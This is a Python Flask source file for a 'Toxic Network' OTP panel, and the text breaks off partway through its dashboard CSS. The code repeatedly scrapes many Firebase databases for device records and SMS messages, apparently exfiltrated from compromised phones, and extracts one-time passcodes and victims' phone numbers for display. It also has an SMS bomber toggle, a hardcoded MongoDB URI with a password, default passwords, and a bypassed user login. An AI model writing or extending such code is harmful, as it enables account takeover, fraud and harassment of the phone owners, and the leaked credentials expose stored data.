from flask import Flask, request, jsonify, session, redirect, url_for, Response
from functools import wraps
from pymongo import MongoClient
from bson import ObjectId
import requests
import os
import re
import json
import threading
import time
import hashlib
from collections import Counter
from datetime import datetime, timezone, timedelta

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "toxic_otp_secret_2025_v24_1")

MONGO_URI = os.environ.get("MONGO_URI", "mongodb+srv://gogo_db_user:4DfbHqcjpjg6TYb8@firebase.snn8z2u.mongodb.net")
BG_REFRESH_INTERVAL = 60
MESSAGE_CACHE_TTL = 10
MAX_SMS_PER_NUMBER = 60
FETCH_TIMEOUT = 10
FAST_FETCH_TIMEOUT = 10
MAX_PARALLEL = 15
MAX_DEVICES_PER_FB = 300
IST = timezone(timedelta(hours=5, minutes=30))

FB_HASH_SALT = os.environ.get("FB_HASH_SALT", "toxic_fb_secure_salt_2025_v24")

MONGO_OK = False
mongo_client = None
db = None
fb_collection = None
settings_collection = None
sms_logs_collection = None


def fb_hash(url):
    return hashlib.sha256((FB_HASH_SALT + url.rstrip("/")).encode()).hexdigest()[:16]


def init_mongo():
    global MONGO_OK, mongo_client, db, fb_collection, settings_collection, sms_logs_collection
    try:
        mongo_client = MongoClient(
            MONGO_URI,
            serverSelectionTimeoutMS=8000,
            connectTimeoutMS=8000,
            socketTimeoutMS=8000,
            maxPoolSize=50,
        )
        db = mongo_client["otp_panel"]
        fb_collection = db["firebases"]
        settings_collection = db["settings"]
        sms_logs_collection = db["sms_logs"]
        mongo_client.admin.command("ping")
        MONGO_OK = True
        print("MongoDB connected")
    except Exception as e:
        MONGO_OK = False
        print(f"MongoDB: {e}")


init_mongo()

DEFAULT_USER_PWD = "User@2025"
DEFAULT_ADMIN_PWD = "Admin@2025"


def get_pwd(role):
    if not MONGO_OK:
        return DEFAULT_USER_PWD if role == "user" else DEFAULT_ADMIN_PWD
    try:
        doc = settings_collection.find_one({"_id": f"{role}_password"})
        if doc and doc.get("value"):
            return doc["value"]
    except Exception:
        pass
    return DEFAULT_USER_PWD if role == "user" else DEFAULT_ADMIN_PWD


def set_pwd(role, value):
    if not MONGO_OK:
        return False
    try:
        settings_collection.update_one(
            {"_id": f"{role}_password"},
            {"$set": {"value": value, "updated_at": int(time.time())}},
            upsert=True,
        )
        return True
    except Exception as e:
        print(f"set_pwd error: {e}")
        return False


def get_setting(key, default=None):
    if not MONGO_OK:
        return default
    try:
        doc = settings_collection.find_one({"_id": key})
        if doc is not None and "value" in doc:
            return doc["value"]
    except Exception:
        pass
    return default


def set_setting(key, value):
    if not MONGO_OK:
        return False
    try:
        settings_collection.update_one(
            {"_id": key},
            {"$set": {"value": value, "updated_at": int(time.time())}},
            upsert=True,
        )
        return True
    except Exception as e:
        print(f"set_setting error: {e}")
        return False


def get_user_panel_state():
    active_str = str(get_setting("user_panel_active", "true")).lower()
    try:
        expires_at = int(get_setting("user_panel_expires_at", 0) or 0)
    except Exception:
        expires_at = 0
    passwordless_str = str(get_setting("passwordless_mode", "true")).lower()
    try:
        pl_expires_at = int(get_setting("passwordless_expires_at", 0) or 0)
    except Exception:
        pl_expires_at = 0

    bomber_active = str(get_setting("sms_bomber_active", "true")).lower() in ("true", "1", "yes")

    now = int(time.time())
    active = active_str in ("true", "1", "yes")
    if active and expires_at > 0 and now >= expires_at:
        active = False
        set_setting("user_panel_active", "false")
        set_setting("user_panel_expires_at", 0)
        expires_at = 0

    passwordless = passwordless_str in ("true", "1", "yes")
    if passwordless and pl_expires_at > 0 and now >= pl_expires_at:
        passwordless = False
        set_setting("passwordless_mode", "false")
        set_setting("passwordless_expires_at", 0)
        pl_expires_at = 0

    return {
        "active": active,
        "expires_at": expires_at if active else 0,
        "passwordless": passwordless,
        "passwordless_expires_at": pl_expires_at if passwordless else 0,
        "bomber_active": bomber_active,
        "now": now,
    }


cache = {
    "numbers_map": {},
    "devices": {},
    "device_messages": {},
    "msg_cache_time": {},
    "stats": {"total": 0, "online": 0, "offline": 0, "otp_rate": 0},
    "last_update": 0,
    "loading": False,
    "progress": {"done": 0, "total": 0},
    "lock": threading.Lock(),
    "inflight": set(),
    "inbox_locks": {},
    "otp_cache": {},
    "otp_cache_time": {},
    "fb_stats": {},
    "fb_stats_time": 0,
}

MSG_FIELDS = {"message", "body", "text", "msg", "content", "messagetext", "messagebody", "sms", "smsbody", "smscontent", "smsbodytext", "lastmessage", "fullmessage", "sms_message", "msgbody"}
TIME_FIELDS = {"timestamp", "time", "date", "receivedtime", "datetime", "createdat", "senttime", "smstime", "devicetime", "date_time", "received_time", "sent_time", "sms_time", "device_time", "smsdate", "receivedat", "sentat", "lastmessagetime", "recvtime", "logtime", "event_time"}
SENT_KEYS = {"command", "commands", "sendsms", "action", "webhookevent", "send_sms", "sentsms", "outgoing"}
INCOMING_TYPES = {"incoming", "received", "inbox", "recv", "in"}


def digits_only(s):
    return re.sub(r"\D", "", str(s) if s is not None else "")


def normalize_number(n):
    d = digits_only(n)
    return d[-10:] if len(d) >= 10 else d


def extract_real_numbers_from_message(message):
    if not message:
        return []
    text = str(message)
    text = re.sub(r'\d{3,4}[Xx*]{2,6}\d{2,4}', ' ', text)
    found = []
    seen = set()
    for m in re.finditer(r'\+91[\s\-]?([6-9]\d{9})', text):
        num = m.group(1)
        if num not in seen:
            seen.add(num)
            found.append(num)
    for m in re.finditer(r'(?<!\d)([6-9]\d{9})(?!\d)', text):
        num = m.group(1)
        if num not in seen:
            seen.add(num)
            found.append(num)
    return found


def parse_date_string(s):
    if not s or not isinstance(s, str):
        return 0
    try:
        m = re.match(r"(\d{1,2})-(\d{1,2})-(\d{4})\s*\|\s*(\d{1,2}):(\d{2})\s*(am|pm)", s.strip(), re.IGNORECASE)
        if not m:
            return 0
        day, month, year, hour, minute, ap = m.groups()
        hour = int(hour)
        if ap.lower() == "pm" and hour != 12:
            hour += 12
        if ap.lower() == "am" and hour == 12:
            hour = 0
        dt = datetime(int(year), int(month), int(day), hour, int(minute), tzinfo=IST)
        return int(dt.timestamp())
    except Exception:
        return 0


def collect_all_messages(obj, found=None, depth=0, parent_ts=0, parent_key=""):
    if found is None:
        found = []
    if depth > 10:
        return found
    pk_lower = parent_key.lower()
    if any(k in pk_lower for k in SENT_KEYS):
        return found
    if isinstance(obj, dict):
        kl = {k.lower() for k in obj.keys()}
        has_body = bool(kl & MSG_FIELDS)
        if has_body:
            def get_any(fs):
                for k in obj.keys():
                    if k.lower() in fs:
                        return obj[k]
                return None
            body = get_any(MSG_FIELDS)
            from_val = None
            for k in obj.keys():
                kl2 = k.lower()
                if kl2 in ("sender", "from", "origin", "address", "src"):
                    v = obj[k]
                    if v and isinstance(v, str) and v.strip():
                        from_val = v.strip()
                        break
            to_val = None
            for k in obj.keys():
                if k.lower() in ("to", "destination", "receiver"):
                    to_val = obj[k]
                    break
            date_str = None
            for k in obj.keys():
                kl2 = k.lower()
                if kl2 in ("datetime", "date_time", "date", "datetimestr"):
                    v = obj[k]
                    if isinstance(v, str) and ("|" in v or "am" in v.lower() or "pm" in v.lower()):
                        date_str = v
                        break
            msg_id = obj.get("id")
            ts = 0
            if date_str:
                ts = parse_date_string(date_str)
            if not ts:
                ts_raw = get_any(TIME_FIELDS)
                if ts_raw:
                    try:
                        ts = int(ts_raw)
                        if ts > 1e12:
                            ts = ts // 1000
                    except Exception:
                        ts = 0
            if not ts and msg_id:
                try:
                    mid = int(msg_id)
                    if mid > 1e12:
                        ts = mid // 1000
                    elif mid > 1e9:
                        ts = mid
                except Exception:
                    pass
            if not ts:
                ts = parent_ts
            msg_type = str(obj.get("type", "")).lower().strip()
            is_sended = obj.get("isSended") if "isSended" in obj else obj.get("isSent")
            keep = False
            if msg_type in INCOMING_TYPES:
                keep = True
            elif msg_type in ("sent", "outgoing"):
                keep = False
            elif is_sended is True:
                keep = False
            elif is_sended is False:
                keep = True
            elif from_val and not to_val:
                keep = True
            elif to_val and not from_val:
                keep = False
            elif not to_val and not from_val:
                keep = True
            else:
                keep = False
            if keep and body:
                display_from = from_val if from_val else "Unknown"
                found.append({
                    "from": str(display_from) if display_from else "Unknown",
                    "to": str(to_val) if to_val else "",
                    "message": str(body),
                    "timestamp": ts,
                    "date_string": date_str,
                    "id": msg_id,
                    "type": "received",
                })
        for k, v in obj.items():
            kl2 = k.lower()
            if any(x in kl2 for x in SENT_KEYS):
                continue
            child_ts = parent_ts
            try:
                tk = int(k)
                if tk > 1e12:
                    child_ts = tk // 1000
                elif tk > 1e9:
                    child_ts = tk
            except Exception:
                pass
            collect_all_messages(v, found, depth + 1, child_ts, k)
    elif isinstance(obj, list):
        for item in obj:
            collect_all_messages(item, found, depth + 1, parent_ts, parent_key)
    return found


def extract_otp(text):
    if not text:
        return ""
    m = re.search(r"(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})", text, re.IGNORECASE)
    if m:
        return m.group(1)
    m = re.search(r"(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)", text, re.IGNORECASE)
    if m:
        return m.group(1)
    m = re.search(r"#(\d{4,8})", text)
    if m:
        return m.group(1)
    return ""


def is_online(info):
    if not isinstance(info, dict):
        return False
    if info.get("status") is True:
        return True
    if info.get("isOnline") is True:
        return True
    if info.get("online") is True:
        return True
    if info.get("connected") is True:
        return True
    if info.get("status") in ("online", "active", 1):
        return True
    if info.get("lastSeen"):
        try:
            ls = int(info.get("lastSeen"))
            if time.time() - ls < 600:
                return True
        except Exception:
            pass
    return False


def find_real_number_from_messages(all_msgs):
    number_counter = Counter()
    sender_numbers = set()
    for m in all_msgs:
        sender = m.get("from", "")
        if sender:
            sender_nums = extract_real_numbers_from_message(sender)
            for sn in sender_nums:
                sender_numbers.add(sn)
    for m in all_msgs:
        if m.get("type") != "received":
            continue
        msg_text = m.get("message", "")
        nums = extract_real_numbers_from_message(msg_text)
        for n in nums:
            if n in sender_numbers:
                continue
            if n.startswith(("1800", "1900", "1991")):
                continue
            number_counter[n] += 1
    return number_counter.most_common(10)


def _finalize_device(name, online, sims, msgs, dev_data):
    seen_m = set()
    unique = []
    for m in msgs:
        h = f"{m.get('from', '')}|{m.get('message', '')[:80]}|{m.get('timestamp', 0)}"
        if h in seen_m:
            continue
        seen_m.add(h)
        unique.append(m)
    unique.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
    unique = unique[:MAX_SMS_PER_NUMBER]
    per_number = {n["number"]: [] for n in sims}
    if sims:
        first_num = sims[0]["number"]
        per_number[first_num] = unique[:]
    for num in per_number:
        per_number[num].sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
        per_number[num] = per_number[num][:MAX_SMS_PER_NUMBER]
    total_otp = sum(1 for m in unique if extract_otp(m.get("message", "")))
    return {
        "name": name, "online": online, "sims": sims,
        "battery": dev_data.get("battery", 0) if isinstance(dev_data, dict) else 0,
        "messages": unique,
        "per_number": per_number,
        "total_msgs": len(unique), "total_otp": total_otp,
    }


_thread_local = threading.local()


def _get_session():
    if not hasattr(_thread_local, "session"):
        s = requests.Session()
        s.headers.setdefault("User-Agent", "Mozilla/5.0")
        _thread_local.session = s
    return _thread_local.session


def try_json(url, timeout=FETCH_TIMEOUT):
    try:
        r = _get_session().get(url, timeout=timeout)
        if r.status_code != 200:
            return None
        t = r.text.strip()
        if not t or t == "null":
            return None
        return json.loads(t)
    except Exception:
        return None


def fetch_device_ids(fb_url):
    base = fb_url.rstrip("/")
    for path in ["/clients.json?shallow=true", "/clients.json", "/devices.json?shallow=true", "/devices.json"]:
        data = try_json(base + path)
        if isinstance(data, dict):
            return list(data.keys())
    return []


def fetch_device_data(fb_url, dev_id):
    base = fb_url.rstrip("/")
    for p in [f"/clients/{dev_id}.json", f"/devices/{dev_id}.json", f"/{dev_id}.json"]:
        data = try_json(base + p)
        if isinstance(data, dict):
            return data
    return None


def fetch_messages_multi_path(fb_url, dev_id, phone_numbers=None):
    base = fb_url.rstrip("/")
    all_msgs = []
    seen = set()
    url = f'{base}/messages/{dev_id}.json?orderBy="$key"&limitToLast=60'
    data = try_json(url, timeout=FAST_FETCH_TIMEOUT)
    if not data:
        url = f'{base}/messages/{dev_id}.json'
        data = try_json(url, timeout=30)
    if data and isinstance(data, dict):
        msgs = collect_all_messages(data)
        for m in msgs:
            h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
            if h in seen:
                continue
            seen.add(h)
            all_msgs.append(m)
    all_msgs.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
    return all_msgs[:MAX_SMS_PER_NUMBER]


def fetch_devices_from_one_fb(fb_url, fb_name="", fb_id=""):
    out = []
    device_ids = fetch_device_ids(fb_url)
    if len(device_ids) > MAX_DEVICES_PER_FB:
        device_ids = device_ids[:MAX_DEVICES_PER_FB]
    for did in device_ids:
        raw = fetch_device_data(fb_url, did)
        if not raw:
            continue
        msgs = fetch_messages_multi_path(fb_url, did, phone_numbers=None)
        if raw:
            inner_msgs = collect_all_messages(raw)
            existing = set()
            for m in msgs:
                h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
                existing.add(h)
            for m in inner_msgs:
                h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
                if h not in existing:
                    msgs.append(m)
                    existing.add(h)
            msgs.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
            msgs = msgs[:MAX_SMS_PER_NUMBER]
        online = is_online(raw)
        name = did[:16]
        for f in ["deviceName", "device_name", "name", "model", "deviceModel", "brand", "manufacturer", "phoneName", "phoneModel", "deviceInfo", "productName", "hardware", "deviceBrand"]:
            v = raw.get(f) if isinstance(raw, dict) else None
            if v and isinstance(v, str) and v.strip():
                name = v.strip()[:25]
                break
        top_candidates = find_real_number_from_messages(msgs)
        sims = []
        if top_candidates:
            real_number = top_candidates[0][0]
            count = top_candidates[0][1]
            sims = [{"slot": 0, "number": real_number, "online": online, "confidence": count}]
        else:
            sims = [{"slot": 0, "number": "UNKNOWN-" + did[:6], "online": online, "confidence": 0}]
        dev = _finalize_device(name, online, sims, msgs, raw)
        dev["id"] = did
        dev["firebase"] = fb_url
        dev["fb_name"] = fb_name
        dev["fb_id"] = fb_id
        out.append(dev)
    return out


def merge_numbers_into_cache(devices):
    with cache["lock"]:
        for dev in devices:
            is_dev_online = dev.get("online", False)
            for sim in dev.get("sims", []):
                num = sim["number"]
                if num.startswith("UNKNOWN-"):
                    key = num
                else:
                    key = normalize_number(num)
                    if not key or len(key) != 10:
                        continue
                msgs = dev.get("per_number", {}).get(num, [])
                otp_count = sum(1 for m in msgs if extract_otp(m.get("message", "")))
                if key not in cache["numbers_map"]:
                    cache["numbers_map"][key] = {
                        "number": num, "device_id": dev["id"], "device_name": dev.get("name", ""),
                        "firebase": dev.get("firebase", ""), "fb_id": dev.get("fb_id", ""),
                        "fb_name": dev.get("fb_name", ""), "online": is_dev_online,
                        "msg_count": len(msgs), "otp_count": otp_count,
                        "battery": dev.get("battery", "?"),
                        "confidence": sim.get("confidence", 0),
                    }
                else:
                    existing = cache["numbers_map"][key]
                    if sim.get("confidence", 0) > existing.get("confidence", 0):
                        existing["number"] = num
                        existing["confidence"] = sim.get("confidence", 0)
                    if len(msgs) > existing["msg_count"]:
                        existing["device_id"] = dev["id"]
                        existing["device_name"] = dev.get("name", "")
                        existing["firebase"] = dev.get("firebase", "")
                        existing["fb_id"] = dev.get("fb_id", "")
                        existing["fb_name"] = dev.get("fb_name", "")
                        existing["msg_count"] = len(msgs)
                        existing["otp_count"] = otp_count
                        existing["online"] = is_dev_online
                    elif is_dev_online and not existing["online"]:
                        existing["online"] = True
            cache["devices"][f"{dev['firebase']}|{dev['id']}"] = dev
        nums = list(cache["numbers_map"].values())
        online = sum(1 for n in nums if n.get("online"))
        offline = len(nums) - online
        total_otp = sum(n.get("otp_count", 0) for n in nums)
        total_msg = sum(n.get("msg_count", 0) for n in nums)
        otp_rate = int((total_otp / total_msg) * 100) if total_msg > 0 else 0
        cache["stats"] = {"total": len(nums), "online": online, "offline": offline, "otp_rate": otp_rate}


def fetch_fb_stats():
    if not MONGO_OK:
        return
    try:
        firebases = list(fb_collection.find({}))
    except Exception:
        return
    results = {}
    sem = threading.Semaphore(MAX_PARALLEL)

    def worker(fb):
        with sem:
            url = fb.get("url", "")
            fb_id = str(fb.get("_id", ""))
            if not url:
                results[fb_id] = {"online": 0, "offline": 0, "devices": 0}
                return
            try:
                devices = fetch_devices_from_one_fb(url, fb.get("name", ""), fb_id)
                online = sum(1 for d in devices if d.get("online"))
                offline = len(devices) - online
                results[fb_id] = {"online": online, "offline": offline, "devices": len(devices)}
            except Exception as e:
                print(f"fb_stats worker error {url}: {e}")
                results[fb_id] = {"online": 0, "offline": 0, "devices": 0}

    threads = []
    for fb in firebases:
        t = threading.Thread(target=worker, args=(fb,), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=90)

    with cache["lock"]:
        cache["fb_stats"] = results
        cache["fb_stats_time"] = time.time()


def fetch_all_devices():
    if not MONGO_OK:
        return
    try:
        firebases = list(fb_collection.find({}))
    except Exception:
        return
    with cache["lock"]:
        cache["progress"] = {"done": 0, "total": len(firebases)}
    sem = threading.Semaphore(MAX_PARALLEL)

    def worker(fb):
        with sem:
            url = fb.get("url", "")
            if not url:
                with cache["lock"]:
                    cache["progress"]["done"] += 1
                return
            try:
                devs = fetch_devices_from_one_fb(url, fb.get("name", ""), str(fb.get("_id", "")))
                merge_numbers_into_cache(devs)
            except Exception as e:
                print(f"worker error {url}: {e}")
            with cache["lock"]:
                cache["progress"]["done"] += 1

    threads = []
    for fb in firebases:
        t = threading.Thread(target=worker, args=(fb,), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=120)


def refresh_cache():
    with cache["lock"]:
        if cache["loading"]:
            return
        cache["loading"] = True
        cache["numbers_map"] = {}
        cache["devices"] = {}
        cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
    try:
        fetch_all_devices()
        fetch_fb_stats()
        with cache["lock"]:
            cache["last_update"] = time.time()
    except Exception as e:
        print(f"Refresh error: {e}")
    finally:
        with cache["lock"]:
            cache["loading"] = False


def bg_refresher():
    time.sleep(5)
    while True:
        try:
            refresh_cache()
        except Exception as e:
            print(f"BG: {e}")
        time.sleep(BG_REFRESH_INTERVAL)


threading.Thread(target=bg_refresher, daemon=True).start()


def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        # USER LOGIN BYPASSED (Passwordless)
        session["logged_in"] = True
        session["role"] = "user"
        
        if request.path.startswith("/api/"):
            return f(*args, **kwargs)
        return f(*args, **kwargs)
    return wrapper


def admin_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not session.get("logged_in") or session.get("role") != "admin":
            if request.path.startswith("/api/"):
                return jsonify({"success": False, "error": "Admin required"}), 401
            return redirect(url_for("admin_login_page"))
        return f(*args, **kwargs)
    return wrapper


# ==================== HACKER CSS ====================
HACKER_BASE_CSS = """
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:'Courier New','Consolas','SF Mono',ui-monospace,monospace}
html,body{overscroll-behavior-y:contain;background:#0a0e1a;color:#e0e6ff;min-height:100vh}
body{padding-bottom:env(safe-area-inset-bottom)}
input,button,textarea,select{font-size:16px !important;-webkit-appearance:none;border-radius:8px;font-family:inherit}
button{touch-action:manipulation;cursor:pointer}
a{-webkit-tap-highlight-color:transparent;text-decoration:none;color:inherit}
::selection{background:#00ff41;color:#000}
::-webkit-scrollbar{width:8px;height:8px}
::-webkit-scrollbar-track{background:#0a0e1a}
::-webkit-scrollbar-thumb{background:#1f2937;border-radius:4px}
::-webkit-scrollbar-thumb:hover{background:#00ff41}
@keyframes spin{to{transform:rotate(360deg)}}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
@keyframes glow{0%,100%{box-shadow:0 0 5px #00ff41,0 0 20px rgba(0,255,65,.3)}50%{box-shadow:0 0 15px #00ff41,0 0 40px rgba(0,255,65,.6)}}
@keyframes scanline{0%{transform:translateY(-100%)}100%{transform:translateY(100vh)}}
@keyframes flicker{0%,100%{opacity:1}50%{opacity:.85}}
"""

# ==================== LOGIN PAGE (ADMIN ONLY) ====================
ADMIN_LOGIN_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — ROOT</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#ff3860">
<style>""" + HACKER_BASE_CSS + """
body{display:flex;align-items:center;justify-content:center;padding:20px;background:radial-gradient(ellipse at center,#1a0a0e 0%,#0a0004 70%)}
body::before{content:"";position:fixed;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,56,96,.03) 2px,rgba(255,56,96,.03) 4px);pointer-events:none;z-index:0}
.box{width:100%;max-width:420px;background:#1a0f14;border:1px solid #2a1010;border-radius:14px;padding:36px 28px;position:relative;z-index:1;box-shadow:0 0 40px rgba(255,56,96,.15),inset 0 0 20px rgba(255,56,96,.03)}
.box::before{content:"";position:absolute;top:-1px;left:-1px;right:-1px;height:2px;background:linear-gradient(90deg,#ff3860,#ff9500,#ff3860);border-radius:14px 14px 0 0;animation:glow 2s infinite;box-shadow:0 0 15px #ff3860}
.logo{text-align:center;margin-bottom:22px}
.logo-icon{font-size:44px;margin-bottom:10px;display:block;filter:drop-shadow(0 0 12px #ff3860)}
h1{text-align:center;font-size:18px;margin-bottom:6px;color:#ff3860;letter-spacing:3px;font-weight:900;text-shadow:0 0 10px rgba(255,56,96,.6);animation:flicker 4s infinite}
p.sub{text-align:center;font-size:11px;color:#5a3040;margin-bottom:26px;letter-spacing:1.5px;text-transform:uppercase}
.pwd-wrap{position:relative}
input{width:100%;padding:16px 48px 16px 16px;border-radius:8px;border:1.5px solid #2a1010;background:#0a0004;color:#e0e6ff;outline:none;transition:.2s;letter-spacing:1px;font-family:'Courier New',monospace}
input:focus{border-color:#ff3860;box-shadow:0 0 0 3px rgba(255,56,96,.15);background:#050002}
input::placeholder{color:#5a3040;letter-spacing:1px}
.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:18px;user-select:none;color:#5a3040;padding:4px}
.toggle-pwd:hover{color:#ff3860}
button{width:100%;margin-top:18px;padding:16px;border:none;border-radius:8px;background:linear-gradient(135deg,#ff3860,#ff9500);color:#0a0004;font-weight:900;font-size:14px;cursor:pointer;transition:.2s;min-height:52px;letter-spacing:3px;text-transform:uppercase;font-family:inherit}
button:hover{box-shadow:0 0 20px rgba(255,56,96,.5);transform:translateY(-1px)}
button:active{transform:scale(.98)}
.err{margin-top:14px;text-align:center;color:#ff3860;font-size:12px;letter-spacing:1px;padding:10px;background:rgba(255,56,96,.1);border:1px solid rgba(255,56,96,.3);border-radius:6px}
.info{margin-top:16px;text-align:center;font-size:10px;color:#5a3040;letter-spacing:1px}</style></head><body>
<form class="box" method="POST">
<div class="logo"><span class="logo-icon">☠️</span></div>
<h1>ROOT ACCESS</h1>
<p class="sub">▸ SUPERMASTERADMIN ◂</p>
<div class="pwd-wrap">
<input type="password" id="pwd" name="password" placeholder="ROOT KEY" required autofocus>
<span class="toggle-pwd" onclick="togglePwd(event)">👁</span>
</div>
<button type="submit">⚡ ESCALATE</button>__ERROR__
<div class="info">🔒 CLASSIFIED · LEVEL 99</div>
</form>
<script>
function togglePwd(e){
  var i=document.getElementById('pwd');var t=e.target;
  if(i.type==='password'){i.type='text';t.textContent='🙈';}
  else{i.type='password';t.textContent='👁';}
}
</script>
</body></html>"""


# ==================== PANEL OFFLINE PAGE ====================
PANEL_OFFLINE_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — OFFLINE</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta http-equiv="refresh" content="15">
<meta name="theme-color" content="#ff3860">
<style>""" + HACKER_BASE_CSS + """
body{display:flex;align-items:center;justify-content:center;padding:20px;background:radial-gradient(ellipse at center,#1a0a0e 0%,#0a0004 70%)}
body::before{content:"";position:fixed;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,56,96,.05) 2px,rgba(255,56,96,.05) 4px);pointer-events:none;z-index:0}
.box{width:100%;max-width:420px;background:#1a0f14;border:1px solid #ff3860;border-radius:14px;padding:36px 28px;position:relative;z-index:1;text-align:center;box-shadow:0 0 60px rgba(255,56,96,.3)}
.icon{font-size:64px;margin-bottom:16px;display:block;animation:pulse 1.5s infinite;filter:drop-shadow(0 0 20px #ff3860)}
h1{color:#ff3860;font-size:22px;letter-spacing:4px;margin-bottom:14px;font-weight:900;text-shadow:0 0 15px rgba(255,56,96,.7);animation:flicker 3s infinite}
p{color:#8a6070;font-size:12px;line-height:1.7;letter-spacing:1px;margin-bottom:8px}
.hint{margin-top:20px;padding:14px;background:rgba(255,56,96,.08);border:1px solid rgba(255,56,96,.25);border-radius:8px;font-size:11px;color:#ff9500;letter-spacing:1px}
.pulse{display:inline-block;width:8px;height:8px;border-radius:50%;background:#ff3860;margin-right:6px;animation:pulse 1s infinite;box-shadow:0 0 10px #ff3860}</style></head><body>
<div class="box">
<span class="icon">🚫</span>
<h1>ACCESS DENIED</h1>
<p>▸ USER PANEL TEMPORARILY OFFLINE ◂</p>
<p style="margin-top:14px;font-size:11px">Administrator ne panel deactivate kar diya hai.</p>
<div class="hint"><span class="pulse"></span>AUTO-RETRY ACTIVE · 15s</div>
</div>
</body></html>"""


# ==================== USER DASHBOARD ====================
USER_DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — OTP Panel</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#00ff41">
<style>""" + HACKER_BASE_CSS + r"""
body{background:#0a0e1a;color:#e0e6ff;padding:0 0 40px;background-image:radial-gradient(ellipse at top,#0a1a0e 0%,#0a0e1a 60%)}
.topbar{background:#0a0e1a;border-bottom:1px solid #1f2937;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top));box-shadow:0 2px 20px rgba(0,255,65,.08)}
.brand{font-size:16px;font-weight:900;letter-spacing:2px;flex-shrink:0}
.brand .toxic{background:linear-gradient(90deg,#00ff41,#00e5ff);-webkit-background-clip:text;background-clip:text;color:transparent;text-shadow:0 0 15px rgba(0,255,65,.3)}
.brand .net{color:#e0e6ff}
.top-actions{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.refresh-btn{background:linear-gradient(135deg,#00ff41,#00e5ff);color:#0a0e1a;border:none;width:42px;height:42px;border-radius:8px;font-size:18px;display:flex;align-items:center;justify-content:center;box-shadow:0 0 15px rgba(0,255,65,.4);transition:.2s;padding:0;font-weight:900}
.refresh-btn:active{transform:scale(.9) rotate(180deg)}
.refresh-btn.spinning{animation:spin 1s linear infinite}
.conn{display:flex;align-items:center;gap:6px;font-size:10px;font-weight:700;padding:6px 10px;border-radius:6px;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
.conn.online{color:#00ff41;background:rgba(0,255,65,.1);border:1px solid rgba(0,255,65,.3)}
.conn.offline{color:#ff3860;background:rgba(255,56,96,.1);border:1px solid rgba(255,56,96,.3)}
.conn.loading{color:#ffd700;background:rgba(255,215,0,.1);border:1px solid rgba(255,215,0,.3)}
.conn .dot{width:7px;height:7px;border-radius:50%;background:currentColor;box-shadow:0 0 8px currentColor}
.conn.online .dot{animation:pulse 1.5s infinite}
.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between;margin-top:8px}
@media(min-width:640px){.nav{order:0;width:auto;margin-top:0}}
.nav-link{padding:10px 14px;border-radius:8px;text-decoration:none;font-size:11px;font-weight:700;color:#7a85a8;background:#111827;border:1px solid #1f2937;transition:.2s;white-space:nowrap;min-height:44px;display:inline-flex;align-items:center;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace;cursor:pointer}
.nav-link:hover{color:#00ff41;border-color:rgba(0,255,65,.3)}
.nav-link.active{background:linear-gradient(135deg,#00ff41,#00e5ff);color:#0a0e1a;border-color:transparent;box-shadow:0 0 15px rgba(0,255,65,.4)}
.container{max-width:900px;margin:0 auto;padding:14px}
.session-banner{background:linear-gradient(135deg,rgba(0,255,65,.15),rgba(0,229,255,.15));border:1px solid rgba(0,255,65,.4);border-radius:8px;padding:12px 14px;margin-bottom:14px;display:flex;align-items:center;gap:10px;font-size:12px;letter-spacing:1px;color:#00ff41;font-weight:700;box-shadow:0 0 15px rgba(0,255,65,.2);font-family:'Courier New',monospace}
.session-banner .pulse{width:8px;height:8px;border-radius:50%;background:#00ff41;box-shadow:0 0 10px #00ff41;animation:pulse 1s infinite;flex-shrink:0}
.session-banner.temp{background:linear-gradient(135deg,rgba(255,215,0,.15),rgba(255,149,0,.15));border-color:rgba(255,215,0,.4);color:#ffd700}
.session-banner.temp .pulse{background:#ffd700}
.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
.stat{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:14px;transition:.3s;position:relative;overflow:hidden}
.stat::before{content:"";position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,currentColor,transparent);opacity:.5}
.stat.flash{background:rgba(0,255,65,.05);border-color:rgba(0,255,65,.3)}
